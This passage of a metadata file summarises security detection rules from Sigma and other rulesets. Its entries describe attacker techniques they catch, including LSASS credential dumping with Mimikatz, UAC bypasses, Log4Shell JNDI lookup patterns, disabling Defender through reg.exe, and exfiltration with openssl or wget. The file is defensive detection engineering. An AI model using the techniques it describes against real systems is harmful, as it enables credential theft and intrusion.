  Summary: This rule detects modifications to the Windows registry that hide file
    extensions. Specifically, it monitors changes to the `\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt`
    and `\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden` registry
    keys, which can be altered to conceal file extensions from the user. Such modifications
    could be indicative of malicious activity aimed at disguising the true nature
    of files, often employed by malware like TrojanSpy:MSIL/Hakey.A.
  Updated-Date: '2024_09_04'
5dfc1465-8f65-4fde-8eb5-6194380c6a62:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9b04eab935a2e396d218fb30b975ff25
  Ruleset: sigmahq
  Summary: This rule detects the enabling of the Windows Recall feature through the
    deletion of the "DisableAIDataAnalysis" registry value. Enabling Windows Recall
    in this manner may be employed by adversaries during post-exploitation activities
    to facilitate discovery and data collection. The rule operates under the assumption
    that Windows Recall was initially disabled on the host.
  Updated-Date: '2024_09_04'
5e3cc4d8-3e68-43db-8656-eaaeefdec9cc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8f7bf243e89cac8d25c8caf73eaf15b5
  Ruleset: sigmahq
  Summary: This rule detects a suspicious execution of the Invoke-WebRequest cmdlet
    in PowerShell, which is typically used to download files from the internet. It
    flags instances where the command uses common aliases like 'curl', 'iwr', and
    'wget', combined with suspicious flags and outputs directed to potentially untrustworthy
    locations such as AppData, Desktop, Temp, Users\Public, or Windows directories.
    This behavior could be indicative of malicious activities such as malware download
    or execution, exemplified by techniques used in the distribution of Cobalt Strike
    through Microsoft Security tools as seen in various attack scenarios.
  Updated-Date: '2024_09_04'
5e6a80c8-2d45-4633-9ef4-fa2671a39c5c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 247b37c40f7c4f3415eabb06192cd5c6
  Ruleset: core
  Summary: This rule detects the execution of suspicious double extension files in
    the ParentCommandLine on Windows systems. It specifically monitors the execution
    of files with extensions such as ".doc.lnk," ".docx.lnk," ".xls.lnk," ".xlsx.lnk,"
    ".ppt.lnk," ".pptx.lnk," ".rtf.lnk," ".pdf.lnk," ".txt.lnk," and their JavaScript
    variants like ".doc.js," ".docx.js," ".xls.js," ".xlsx.js," ".ppt.js," ".pptx.js,"
    ".rtf.js," ".pdf.js," and ".txt.js." These double extensions are often used to
    disguise malicious files, allowing them to evade detection and trick users into
    executing them.
  Updated-Date: '2024_09_03'
5e95028c-5229-4214-afae-d653d573d0ec:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b49e3e05ceae732ab96fc44cdd565c78
  Ruleset: core
  Summary: This rule detects the execution of "reg.exe" commands used to disable security
    services on Windows systems, such as Windows Defender and others. The rule monitors
    for command-line activity that includes modifying registry keys to change the
    startup behavior of various security-related services, ensuring that any attempts
    to add specific values that would disable these services are identified.
  Updated-Date: '2024_09_03'
5e993621-67d4-488a-b9ae-b420d08b96cb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cff15fd9b7d8587988b01095970e144b
  Ruleset: sigmahq
  Summary: This rule detects the installation of services in suspicious directories
    such as AppData, or installation paths that reference loopback addresses like
    127.0.0.1 or localhost. It specifically monitors events with the Provider Name
    'Service Control Manager' and Event ID 7045 to identify these activities.
  Updated-Date: '2024_09_04'
5ea8faa8-db8b-45be-89b0-151b84c82702:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 438a5bd8bee2ccdf718d7eaa7e94aa76
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts against the log4j RCE vulnerability
    known as CVE-2021-44228, also referred to as Log4Shell. The rule identifies suspicious
    patterns in web server logs that indicate an attempt to exploit this vulnerability.
    Specifically, it looks for instances of malicious JNDI lookups, which are a key
    characteristic of Log4Shell attacks, including variations like `${jndi:ldap:/`,
    `${jndi:rmi:/`, `${jndi:ldaps:/`, and several obfuscated forms. The detection
    process excludes certain benign patterns related to vulnerability scanning to
    reduce false positives. The rule aims to promptly alert on high-risk attempts
    to exploit this critical vulnerability, thereby assisting in mitigating potential
    security breaches.
  Updated-Date: '2024_09_03'
5edc2273-c26f-406c-83f3-f4d948e740dd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 01a5840bd0f13aa9496cbcf7fb80d4e7
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Microsoft bash launcher (`bash.exe`)
    with the `-c` flag. This usage can be leveraged to bypass security defenses and
    execute both Linux and Windows binaries directly via bash. This technique is indicative
    of potential malicious activity aiming at defense evasion.
  Updated-Date: '2024_09_04'
5ef9853e-4d0e-4a70-846f-a9ca37d876da:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d5e9f37de62303cd0f9a899b6068a06c
  Ruleset: sigmahq
  Summary: This rule detects potential credential dumping activity by identifying
    process access requests to the LSASS process with specific call traces and access
    masks. Credential dumping tools such as Mimikatz, NanoDump, Invoke-Mimikatz, Procdump,
    and the Task Manager dumping feature often exhibit this behavior. The detection
    focuses on the LSASS process (`lsass.exe`) and examines the granted access codes
    and call traces associated with core Windows DLLs such as `dbgcore.dll`, `dbghelp.dll`,
    `kernel32.dll`, `kernelbase.dll`, and `ntdll.dll`. To reduce false positives,
    it includes filters for main system users and specific optional cases like Thor
    and Sysmon.
  Updated-Date: '2024_09_04'
5f03babb-12db-4eec-8c82-7b4cb5580868:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a9c2327e862af15061c61937dabaa631
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "odbcconf.exe" process with the
    "-f" flag, which is used to load a response file that may contain malicious actions.
    The detection focuses on the command line arguments and the presence of ".rsp"
    files to identify potentially harmful operations. This method of execution can
    be used for defense evasion by loading malicious payloads through seemingly legitimate
    system utilities. Investigating the contents of the response file is recommended
    to confirm if the activity is malicious.
  Updated-Date: '2024_09_04'
5f1573a7-363b-4114-9208-ad7a61de46eb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6cf9e7272fda6a32aac35b82c78b46b1
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "esxcli" command with the "vm" flag,
    which is used to retrieve information about installed virtual machines (VMs) on
    ESXi servers. This activity may indicate an attempt to discover and enumerate
    virtual machines within the hypervisor environment. It is particularly relevant
    in scenarios where attackers are targeting ESXi servers with malicious intent,
    as seen in eCrime activities involving hypervisor jackpotting and ransomware attacks
    such as ESXiArgs and Cheerscrypt. Monitoring for this command can help identify
    potentially suspicious behavior indicative of such threats.
  Updated-Date: '2024_09_04'
5f521e4b-0105-4b72-845b-2198a54487b9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d9aa78ad51e2e5fae0f87ea56e44df6e
  Ruleset: sigmahq
  Summary: "This rule detects occurrences when users from one Azure Active Directory\
    \ (Azure AD) tenant authenticate to different Azure AD tenants. This activity\
    \ is identified by a successful sign-in status with a HomeTenantId match to the\
    \ user\u2019s original tenant, excluding cases explicitly approved by a System\
    \ Administrator."
  Updated-Date: '2024_09_04'
5f699bc5-5446-4a4a-a0b7-5ef2885a3eb4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 95e8deeeb88b526268be05c8b8f41727
  Ruleset: core
  Summary: This rule detects Remote Desktop Protocol (RDP) over a reverse SSH tunnel
    by identifying instances of the 'svchost.exe' process, typically hosting RDP services
    (termsvcs), communicating with the loopback address (127.0.0.1 or ::1) on TCP
    port 3389. The presence of such activity can indicate lateral movement or command-and-control
    techniques on a Windows system.
  Updated-Date: '2024_09_03'
5f6a601c-2ecb-498b-9c33-660362323afa:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7d50d8c1fe89b4e6305f92b2d7f5ca54
  Ruleset: core
  Summary: This rule detects the installation of a root certificate from suspicious
    locations on a compromised Windows system. Adversaries may perform this action
    to bypass security warnings when connecting to malicious web servers they control.
    The rule specifically identifies the use of the Import-Certificate command with
    file paths located in temporary or user directories such as AppData\Local\Temp,
    Windows\TEMP, Desktop, Downloads, Perflogs, and Users\Public. The presence of
    these commands and paths in process creation logs indicates potential malicious
    activity related to defense evasion tactics.
  Updated-Date: '2024_09_03'
5f87308a-0a5b-4623-ae15-d8fa1809bc60:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2042243d2497d9410a24739fb8b32f4e
  Ruleset: sigmahq
  Summary: This rule detects the creation of copies of suspicious executable (EXE)
    or dynamic link library (DLL) files in the default Group Policy Object (GPO) storage
    folder on Windows systems. Such activity is indicative of potential defense evasion
    techniques, as malicious actors may use these file types to disguise their presence
    or hijack legitimate processes.
  Updated-Date: '2024_09_04'
5f92fff9-82e2-48eb-8fc1-8b133556a551:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c378725e33dbc790d3985e79978612c9
  Ruleset: core
  Summary: This rule detects remote RPC calls that could potentially abuse the remote
    encryption service via Microsoft's Encrypting File System Remote (MS-EFSR). It
    monitors for specific UUIDs indicating the presence of such activity, which is
    logged under event ID 3 in the RPC Firewall application logs. The rule aims to
    identify unauthorized attempts at remote file encryption, which could be part
    of lateral movement strategies in attack scenarios. Legitimate use cases of remote
    file encryption are considered as potential false positives.
  Updated-Date: '2024_09_03'
5f9db380-ea57-4d1e-beab-8a2d33397e93:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e7774871ee65c326265ec71d6d253e18
  Ruleset: core
  Summary: This rule detects an attempt to bypass User Account Control (UAC) by leveraging
    Windows Media Player's osksupport.dll, associated with the UACMe tool. The detection
    focuses on specific changes in the Windows Registry related to the Compatibility
    Assistant's Store settings for the on-screen keyboard executable within Windows
    Media Player. This technique is linked to defense evasion and privilege escalation.
  Updated-Date: '2024_09_03'
5fc297ae-25b6-488a-8f25-cc12ac29b744:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 930d28f1c61ed584704a75b2a0369ba0
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious execution of the Qemu utility
    in a Windows environment. Qemu is typically used for hardware virtualization,
    but threat actors have been known to exploit this utility for achieving network
    access. The rule looks for specific command-line arguments such as minimal memory
    settings (e.g., '-m 1M', '-m 2M'), network configurations without restrictions
    (e.g., 'restrict=off', '-netdev', 'connect='), and usage without a graphical interface
    ('-nographic'). These flags are unusual under normal circumstances and may indicate
    malicious activity.
  Updated-Date: '2024_09_04'
6004abd0-afa4-4557-ba90-49d172e0a299:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ede200947c290cfaaf3b0f6b5b7fdd6b
  Ruleset: core
  Summary: This rule detects the execution of the Program Compatibility Assistant
    ("pcwrun.exe") as a means to exploit the Follina vulnerability (CVE-2022-30190).
    The detection is triggered when the "pcwrun.exe" process is executed with a command
    line containing a specific relative path indicator '../', which is indicative
    of an attempt to leverage this vulnerability for malicious purposes.
  Updated-Date: '2024_09_03'
602a1f13-c640-4d73-b053-be9a2fa58b96:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 39912fbbf06b536f391d1b80fda1924a
  Ruleset: core
  Summary: This rule detects the creation of malicious batch (.bat) files by the Powerup
    tool, which exploits DLL hijacking to achieve privilege escalation. Powerup, in
    its default mode, generates a self-deleting .bat file named "debug.bat" that executes
    malicious commands, enabling attackers to elevate their privileges on the target
    system. The detection focus is on identifying the creation of such bat files by
    monitoring specific patterns linked to PowerShell and PowerShell Core executables.
  Updated-Date: '2024_09_03'
602f5669-6927-4688-84db-0d4b7afb2150:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c1b5c62b8f2e809f4c48c586483277be
  Ruleset: core
  Summary: This rule detects scripts or commands designed to disable the PowerShell
    command history by removing the `psreadline` module.
  Updated-Date: '2024_09_03'
603c6630-5225-49c1-8047-26c964553e0e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6ce813bc820d9d0119a2c58e1381d626
  Ruleset: sigmahq
  Summary: This rule detects the enumeration of user credentials from the Windows
    Credential Manager using PowerShell. Adversaries may exploit this to search for
    stored passwords within common locations on the system. It triggers when specific
    PowerShell script block texts, such as "vaultcmd" and "/listcreds:", are found,
    along with mentions of "Windows Credentials" or "Web Credentials." This can indicate
    an attempt to access sensitive credential information stored on a Windows system.
  Updated-Date: '2024_09_04'
60911c07-f989-4362-84af-c609828ef829:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7d2f56431bc7b14639ac44b9e4b11d4d
  Ruleset: emerging-threats
  Summary: This rule detects the execution of the "openssl" command to connect to
    an IP address, indicating potential use by UNC4841 for exfiltrating SSL certificates
    and establishing command and control (C2) channels through named pipes. The detection
    focuses on specific command-line patterns, including the use of 's_client', '-quiet',
    and '-connect', along with connections on ports 443 and 8080. Commands executed
    around the same time as this activity should be investigated thoroughly.
  Updated-Date: '2024_09_03'
60bfeac3-0d35-4302-8efb-1dd16f715bc6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c680bac5b2f37c641010a70129aee23c
  Ruleset: sigmahq
  Summary: This rule detects suspicious child processes spawned by the SysAidServer,
    which operates in Java environments indicated by parent processes such as `java.exe`
    or `javaw.exe`. This behavior has been observed in intrusions conducted by the
    MERCURY threat actor, particularly in attacks exploiting Log4j 2 vulnerabilities
    in unpatched systems.
  Updated-Date: '2024_09_04'
60c0a111-787a-4e8a-9262-ee485f3ef9d5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0fd84bcbc7704296e2d0b6efd4b6b639
  Ruleset: emerging-threats
  Summary: This rule detects suspicious file creation activities associated with the
    exploitation of CVE-2021-40444. It specifically monitors for instances where the
    Word application (`winword.exe`) creates CAB files in the Windows INetCache directory
    or INF files in the AppData\Local\Temp directory. These patterns are typically
    indicative of malicious behavior linked to this particular vulnerability. To minimize
    false positives, the rule excludes legitimate file paths that match the exclusion
    criteria.
  Updated-Date: '2024_09_03'
60d050c4-e253-4d9a-b673-5ac100cfddfb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 535c3b7bd4afb9af9916121a6c59f3c7
  Ruleset: emerging-threats
  Summary: This rule detects the execution of the "wget" command to download ".zip"
    or ".rar" files from the "temp.sh" website. This behavior was observed in the
    activities of threat group UNC4841 during the exploitation of a zero-day vulnerability
    in Barracuda ESG.
  Updated-Date: '2024_09_03'
60de9b57-dc4d-48b9-a6a0-b39e0469f876:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: aebbf2a6ef60eeba4452db83b3608135
  Ruleset: core
  Summary: "This rule detects the disabling of Multi-Factor Authentication (MFA) in\
    \ environments utilizing Microsoft 365 services. The specific operation monitored\
    \ is any attempt to 'Disable Strong Authentication,' which could indicate a potential\
    \ breach or an attempt to weaken the security posture of the system. The detection\
    \ is based on audit logs and is critical for identifying unauthorized changes\
    \ that could impact the organization\u2019s security."
  Updated-Date: '2024_09_03'
60f16a96-db70-42eb-8f76-16763e333590:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 95b2f603716b418bfd0272b611df64a4
  Ruleset: sigmahq
  Summary: This rule detects the execution of "DXCap.EXE" with the "-c" flag. The
    "-c" flag allows a user to launch any arbitrary binary or Windows package using
    DXCap. This behavior can be abused to potentially bypass application whitelisting
    mechanisms, posing a security threat.
  Updated-Date: '2024_09_04'
60f6535a-760f-42a9-be3f-c9a0a025906e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6d374cdd53305719d32d0ac466cc1a48
  Ruleset: core
  Summary: This rule detects instances when legacy authentication protocols, such
    as IMAP, POP3, MAPI, SMTP, Exchange ActiveSync, and Exchange Web Services, have
    been used on an account in Azure Sign-in Logs. Legacy authentication is generally
    considered less secure due to its susceptibility to various types of credential
    attacks and may indicate attempts at unauthorized access.
  Updated-Date: '2024_09_03'
60fc936d-2eb0-4543-8a13-911c750a1dfc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2e0f075458a9d0ded8747ada26ed7af4
  Ruleset: core
  Summary: This rule detects an interactive AT job, which may be used as a form of
    privilege escalation. The detection is based on process creation logs specifically
    targeting instances of the 'at.exe' utility with command lines containing the
    term 'interactive.' This activity is considered suspicious as 'at.exe' has been
    deprecated since Windows 8, making its legitimate usage rare.
  Updated-Date: '2024_09_03'
61171ffc-d79c-4ae5-8e10-9323dba19cd3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5317cde0b07e01404317e60fc02c5f3a
  Ruleset: sigmahq
  Summary: This rule detects when a VPN connection is either modified or deleted within
    an Azure environment. Monitoring these activities is crucial as unauthorized changes
    to VPN connections can impact network security and connectivity. The detection
    focuses on operations associated with writing or deleting VPN gateway connection
    configurations. Any unexpected modifications or deletions should be investigated,
    especially if performed by unfamiliar users, to ensure no unauthorized access
    or malicious activity is occurring.
  Updated-Date: '2024_09_04'
611eab06-a145-4dfa-a295-3ccc5c20f59a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dec36336ccc97b5d29a96f8be35e2f20
  Ruleset: core
  Summary: This rule detects security events associated with Mimikatz DC sync activity
    on Windows systems by monitoring logs for specific Event ID 4662 occurrences.
    It looks for properties related to directory replication changes and certain GUIDs
    that indicate such activity, along with a specific access mask value. The rule
    includes filters to exclude noise from the "Window Manager" domain, usernames
    beginning with 'NT AUT' or 'MSOL_', and those ending with a dollar sign. The detection
    aims to identify unauthorized attempts to replicate directory changes using Mimikatz,
    a tool commonly used for credential dumping and exploiting Windows security.
  Updated-Date: '2024_09_03'
6120ac2a-a34b-42c0-a9bd-1fb9f459f348:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 92e272fe65c5bdfa72b6ec3bddd66d3c
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Add-In deployment cache updating
    utility (AddInutil.exe) from a directory that is not typically associated with
    its standard and legitimate locations. Addinutil.exe is generally used in maintaining
    add-in deployment caches on Windows systems. Potentially malicious activity is
    indicated when this executable runs from an uncommon directory, which deviates
    from the expected paths within the Windows.NET Framework and WinSxS directories.
  Updated-Date: '2024_09_04'
612e47e9-8a59-43a6-b404-f48683f45bd6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 90ad81753d80542040c71dffca98ef7f
  Ruleset: sigmahq
  Summary: This rule detects changes to the "ServiceDLL" registry value associated
    with a service, which is commonly used as a method for maintaining persistence
    and achieving privilege escalation in Windows environments. The rule focuses on
    specific registry paths such as those under `\System\`, `ControlSet`, and `\Services\`,
    particularly targeting the `\Parameters\ServiceDll` entry. Exceptions are made
    for known benign usages, including certain system processes and specific DLL paths
    associated with legitimate software activities, to reduce false positives. Administrative
    scripts and service installations may also inadvertently trigger this detection.
  Updated-Date: '2024_09_04'
613c03ba-0779-4a53-8a1f-47f914a4ded3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 255784372a86c7ab3252c47765cfaa81
  Ruleset: sigmahq
  Summary: This rule detects DNS queries for subdomains related to the MEGA sharing
    website, specifically targeting those that contain the string 'userstorage.mega.co.nz'.
    It aims to identify potential data exfiltration activities associated with the
    usage of MEGA, a known platform for cloud storage and file sharing. Although legitimate
    queries to MEGA can occur, this rule highlights suspicious activity that may indicate
    unauthorized data transfer.
  Updated-Date: '2024_09_04'
614a7e17-5643-4d89-b6fe-f9df1a79641c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 83c323d91efa34e1269bb9a70c239e83
  Ruleset: core
  Summary: This rule detects a threat actor creating a file named `wbemcomn.dll` in
    the `C:\Windows\System32\wbem\` directory over the network, which is indicative
    of a Windows Management Instrumentation (WMI) DLL hijacking attempt. Such activity
    is a red flag for unauthorized lateral movement and execution attempts within
    a system.
  Updated-Date: '2024_09_03'
614cf376-6651-47c4-9dcc-6b9527f749f4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e78b9025b2370da65c39cbd892b6d587
  Ruleset: core
  Summary: This rule detects updates to scheduled tasks on Windows systems that contain
    suspicious keywords. It monitors event ID 4702 and looks for task content changes
    that reference directories typically associated with temporary or user data locations,
    such as '\AppData\Local\Temp\' and 'C:\ProgramData\'. Additionally, it identifies
    the use of certain command-line tools and scripts such as 'regsvr32', 'rundll32',
    'cmd.exe', 'powershell', 'mshta', and 'certutil', which are often utilized for
    malicious purposes like execution, privilege escalation, and persistence. The
    detection relies on monitoring changes that match these criteria to help identify
    potential security threats.
  Updated-Date: '2024_09_03'
61a7697c-cb79-42a8-a2ff-5f0cdfae0130:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8fcc804a1fd823cdc75950e6a4ad4f45
  Ruleset: core
  Summary: This rule detects potential malicious installations of services related
    to the Cobalt Strike tool, which may occur when a Cobalt Strike beacon elevates
    privileges or executes lateral movement within a network. The detection examines
    changes to the Windows registry specifically targeting entries under '\System\CurrentControlSet\Services'
    or entries containing both '\System\ControlSet' and '\Services'. Additionally,
    it looks for details in the registry entries that include 'ADMIN$', '.exe', '%COMSPEC%',
    'start', and 'powershell'. The rule aims to identify these suspicious patterns
    to aid in the detection of unauthorized administrative activities often associated
    with Cobalt Strike's beacon operations.
  Updated-Date: '2024_09_03'
61d0475c-173f-4844-86f7-f3eebae1c66b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 217fd0a4e502ffc8dda931b15a772f3d
  Ruleset: sigmahq
  Summary: This rule detects attempts to change the PowerShell script execution policy
    to a potentially insecure level using the "Set-ExecutionPolicy" cmdlet. It specifically
    looks for policies set to 'Unrestricted' or 'Bypass', which could allow the execution
    of scripts without proper security checks. The rule excludes benign cases associated
    with downloading and installing Chocolatey, a package manager for Windows.
  Updated-Date: '2024_09_04'
62120148-6b7a-42be-8b91-271c04e281a3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b28b18041cfd5ef4ba0aba7c35e7df46
  Ruleset: core
  Summary: This rule detects processes that access the camera and microphone from
    suspicious directories such as temporary folders, recycle bin, and default user
    directories on a Windows system. It identifies registry events where the target
    object involves permissions for the camera and microphone, specifically under
    paths indicating irregular or temporary file locations. This may indicate potential
    unauthorized or malicious use of these devices.
  Updated-Date: '2024_09_03'
62a3b85c-2923-4af3-8827-0c35e0d303da:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d948b54dbd33c0613612e58dd1a159ea
  Ruleset: securityonion-resources
  Summary: This rule detects actions sent to the Redis service on a Security Onion
    Intrusion Detection Honeypot (IDH) node, which is used to monitor and log potential
    security threats. The detection is based on logs generated by the opencanary tool,
    specifically focusing on log type 17001. This aids in identifying unauthorized
    or suspicious access to the Redis service, which is crucial for maintaining the
    integrity and security of the honeypot environment.
  Updated-Date: '2024_08_07'
62b20d44-1546-4e61-afce-8e175eb9473c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a8fb8489d7092ac1804140209f5e826e
  Ruleset: sigmahq
  Summary: This rule detects the use of the PowerShell "Set-Service" cmdlet to modify
    the startup type of a Windows service to either "disabled" or "manual." This behavior
    is often associated with execution or defense evasion techniques, specifically
    referenced as attack technique T1562.001. The detection focuses on process creation
    events involving PowerShell and monitors command lines that include "Set-Service"
    along with the "-StartupType" parameter. Although legitimate troubleshooting scripts
    may trigger false positives, the rule is essential for identifying potential malicious
    activities aiming to alter service configurations for persistence or evasion.
  Updated-Date: '2024_09_04'
62b7ccc9-23b4-471e-aa15-6da3663c4d59:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8fd12f18656261c3b759489b56d6be69
  Ruleset: core
  Summary: This rule detects the use of PowerShell commands that involve base64 encoded
    sequences related to the reflective loading of .NET assemblies. Such activity
    is indicative of advanced malware behaviors, such as those seen in ransomware
    or other sophisticated attacks, which utilize reflective techniques to load malicious
    code directly into memory to evade detection. The detection focuses on identifying
    specific encoded patterns within command lines that suggest the use of reflective
    assembly loading methods in PowerShell scripts. This type of code execution is
    often employed to bypass traditional security mechanisms.
  Updated-Date: '2024_09_03'
62e0298b-e994-4189-bc87-bc699aa62d97:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fa80eb61702d18a4703b37d3d20c4935
  Ruleset: sigmahq
  Summary: This rule detects the import of '.reg' files from suspicious paths using
    the 'reg.exe' utility. It monitors for specific indicators in the process creation
    logs, focusing on instances where 'reg.exe' is the image name and the command
    line contains the term 'import.' It also considers whether the command line includes
    commonly targeted directories such as 'C:\Users\', '%temp%', '%tmp%', '%appdata%',
    '\AppData\Local\Temp\', 'C:\Windows\Temp\', and 'C:\ProgramData\'. This behavior
    may indicate an attempt at unauthorized modification of the Windows registry,
    which is often associated with evasive techniques employed by malware or attackers
    to subvert system defenses.
  Updated-Date: '2024_09_04'
62ed5b55-f991-406a-85d9-e8e8fdf18789:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 78463149832536b4a7714bdada58e543
  Ruleset: core
  Summary: This rule detects the pattern of UAC Bypass using the consent.exe and comctl32.dll
    files, particularly related to methods employed by UACMe version 22. The detection
    focuses on specific file activities within the Windows operating system, identifying
    instances where the file consent.exe in System32 has an additional file extension
    and is associated with the loading of the comctl32.dll file. This behavior is
    indicative of attempts to bypass User Account Control (UAC) for unauthorized privilege
    escalation and defense evasion.
  Updated-Date: '2024_09_03'
62f7c9bf-9135-49b2-8aeb-1e54a6ecc13c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 984e399e6a988b6178de74df26cde904
  Ruleset: core
  Summary: This rule detects the execution of the Tor client or Tor Browser on Windows
    systems by identifying processes ending with 'tor.exe' or 'Tor Browser\Browser\firefox.exe'.
    Tor is a software tool that enables anonymous communication by routing internet
    traffic through a global volunteer network of servers to conceal a user's location
    and usage. Detecting these processes can indicate attempts to use the Tor network
    for activities such as command-and-control communications.
  Updated-Date: '2024_09_03'
6309645e-122d-4c5b-bb2b-22e4f9c2fa42:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 131f23374c949d42d6d5d788a99e5a37
  Ruleset: core
  Summary: This rule detects the potential creation of a remote thread with characteristics
    indicative of Cobalt Strike beacons. Cobalt Strike is a popular penetration testing
    tool that can be used by security researchers and malicious actors alike. This
    rule specifically looks for remote threads indicating process injection, a technique
    often employed by Cobalt Strike for maintaining persistence and evading defenses.
    Identified by specific patterns in thread start addresses, this detection method
    helps in identifying and mitigating potential threats associated with the tool.
  Updated-Date: '2024_09_03'
631b22a4-70f4-4e2f-9ea8-42f84d9df6d8:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 44515caf03eb1d478467b6057c02098a
  Ruleset: core
  Summary: This rule detects the execution of the Add-In deployment cache updating
    utility (AddInUtil.exe) with suspicious Addinroot or Pipelineroot paths. An adversary
    may run AddinUtil.exe with unconventional Addinroot/Pipelineroot paths that direct
    to their own Addins.Store payload. Indications include the presence of certain
    command line arguments and paths in the command line syntax that point to temporary
    or user-accessible directories, such as \AppData\Local\Temp\, \Desktop\, \Downloads\,
    \Users\Public\, and \Windows\Temp\.
  Updated-Date: '2024_09_03'
6331d09b-4785-4c13-980f-f96661356249:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7a86865db240eb73a4d79a47dbe197dc
  Ruleset: sigmahq
  Summary: This rule detects a PowerShell downgrade attack by comparing the host versions
    with the actual engine version 2.0. This type of attack involves forcing PowerShell
    to use an older, more vulnerable version of its engine, which can bypass security
    controls and facilitate malicious activity. Monitoring discrepancies between the
    host and engine versions can reveal such downgrade attempts, helping to enhance
    system security and prevent potential exploitations.
  Updated-Date: '2024_09_04'
6345b048-8441-43a7-9bed-541133633d7a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1fc161e9564ca467cd86339afdf5c437
  Ruleset: core
  Summary: This rule detects the execution of "dctask64.exe," which is a signed binary
    by ZOHO Corporation and part of ManageEngine Endpoint Central. The binary has
    legitimate uses but can be abused for DLL injection, and for arbitrary command
    and process execution. The rule monitors for specific indicators such as certain
    hash values and command line strings associated with the misuse of "dctask64.exe."
    Detection can help identify potential abuse of this tool for malicious purposes
    within an environment.
  Updated-Date: '2024_09_03'
6360757a-d460-456c-8b13-74cf0e60cceb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ada50e90280d7cce3c34cd52195912c9
  Ruleset: core
  Summary: This rule detects potential DLL sideloading via the comctl32.dll file to
